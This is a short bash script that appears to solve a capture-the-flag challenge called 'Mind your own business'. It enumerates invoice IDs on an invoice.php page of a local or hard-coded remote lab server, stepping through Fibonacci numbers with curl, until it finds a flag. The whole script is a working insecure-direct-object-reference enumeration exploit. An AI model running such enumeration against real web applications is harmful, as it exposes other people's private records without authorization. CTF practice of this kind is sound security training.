#!/bin/bash
PORT=8085

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.115:'$PORT
else
    url=$1':'$2
fi

# Mind your own business
echo "Start exploit for Mind your own business"
url=$url'/invoice.php?invoice='
fibb_1=1
fibb_2=1
while [ $fibb_2 -le 50000 ]
do
    flag=$(curl -s $url$fibb_2 | grep -o "SSS{.*}")
    if [[ ! -z $flag ]]; then 
        break
    fi
    fibb_2=$(($fibb_2 + $fibb_1))
    fibb_1=$(($fibb_2 - $fibb_1))
done
echo "Flag is $flag"
echo "----------------------------"
